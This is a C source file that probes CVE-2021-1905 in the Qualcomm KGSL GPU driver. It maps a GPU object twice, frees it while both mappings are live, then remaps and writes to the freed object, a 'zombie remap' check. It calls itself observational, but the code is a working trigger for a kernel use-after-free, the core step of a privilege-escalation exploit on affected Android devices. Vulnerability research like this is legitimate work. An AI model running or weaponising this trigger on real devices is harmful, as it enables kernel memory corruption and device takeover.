/* kgsl-dblcheck.c v2 — lifetime / refcount / "zombie entry" probe for the
 * CVE-2021-1905 double-map.
 *
 * Patch #1 (d6770f2b86b6) replaces the shared memdesc->useraddr/mapsize with a
 * per-map atomic map_count + check_vma().  With a single shared useraddr, a
 * memdesc backing two VMAs can be stranded: the object can be freed / marked
 * pending while a VMA still points at it, or remapped after being freed.
 * Observational only.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define DEV "/dev/kgsl-3d0"
#define USE_CPU_MAP 0x10000000ULL
struct kgsl_gpuobj_alloc { uint64_t size, flags, va_len, mmapsize; unsigned int id, metadata_len; uint64_t metadata; };
struct kgsl_gpuobj_info  { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
struct kgsl_gpuobj_free  { uint64_t flags, priv; unsigned int id, type, len; };
#define IOCTL_GPUOBJ_ALLOC  _IOWR(KGSL_IOC_TYPE,0x45,struct kgsl_gpuobj_alloc)
#define IOCTL_GPUOBJ_FREE   _IOWR(KGSL_IOC_TYPE,0x46,struct kgsl_gpuobj_free)
#define IOCTL_GPUOBJ_INFO   _IOWR(KGSL_IOC_TYPE,0x47,struct kgsl_gpuobj_info)

static int fd;
static void on_alarm(int s){ (void)s; write(1,"[!] alarm\n",10); _exit(0x42); }
static int info(unsigned id, struct kgsl_gpuobj_info *o){
    memset(o,0,sizeof *o); o->id=id;
    return ioctl(fd,IOCTL_GPUOBJ_INFO,o);
}
static void show(const char *tag, unsigned id){
    struct kgsl_gpuobj_info o; int r=info(id,&o);
    if(r==0) printf("%-24s INFO ok  gpuaddr=0x%llx va=0x%llx\n",tag,
                    (unsigned long long)o.gpuaddr,(unsigned long long)o.va_addr);
    else printf("%-24s INFO rc=-1 errno=%d (%s)\n",tag,errno,
                errno==22?"id GONE":"other");
}
static void dofree(const char *tag, unsigned id){
    struct kgsl_gpuobj_free f; memset(&f,0,sizeof f); f.id=id;
    int r=ioctl(fd,IOCTL_GPUOBJ_FREE,&f);
    printf("%-24s free rc=%d errno=%d%s\n",tag,r,errno,r<0?" (FAIL)":"");
}
int main(void){
    setvbuf(stdout,NULL,_IONBF,0); signal(SIGALRM,on_alarm); alarm(50);
    printf("== kgsl double-map lifetime probe v2 (uid=%d) ==\n",(int)getuid());
    fd=open(DEV,O_RDWR); if(fd<0){ printf("[-] open: %s\n",strerror(errno)); return 1; }

    struct kgsl_gpuobj_alloc sa; memset(&sa,0,sizeof sa);
    sa.size=0x2000; sa.flags=USE_CPU_MAP; sa.va_len=0x2000;
    if(ioctl(fd,IOCTL_GPUOBJ_ALLOC,&sa)<0){ printf("[-] alloc: %s\n",strerror(errno)); return 1; }
    unsigned id=sa.id;
    show("[0] fresh", id);

    void *v1=mmap(NULL,0x2000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)id<<12);
    ((volatile char*)v1)[0]='A'; ((volatile char*)v1)[0x1000]='B';
    show("[1] mmap#1", id);

    void *m=mremap(v1,0x2000,0x1000,0); if(m!=MAP_FAILED) v1=m;
    show("[2] shrink", id);

    void *v2=mmap(NULL,0x2000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)id<<12);
    show("[3] mmap#2", id);

    /* A) free the object while BOTH vmas are still mapped */
    dofree("[4] free (both vm live)", id);
    show("[4]  ->", id);

    /* B) unmap the head; the tail (v2) still maps it */
    munmap(v1,0x1000);
    show("[5] munmap(v1)", id);

    /* C) can we remap a *freed* object? (useraddr now 0) */
    void *v3=mmap(NULL,0x2000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)id<<12);
    printf("[6] mmap#3 on freed id: %p%s errno=%d\n",v3, v3==MAP_FAILED?" (FAIL)":" -> ZOMBIE REMAP",errno);
    if(v3!=MAP_FAILED){ show("[6]  ->", id); ((volatile char*)v3)[0]='Z'; }

    /* D) unmap the last original mapping (v2) */
    munmap(v2,0x2000);
    show("[7] munmap(v2)", id);

    /* E) free again (should be a no-op / id gone) */
    dofree("[8] free again", id);
    show("[8]  ->", id);

    printf("== done ==\n"); return 0;
}
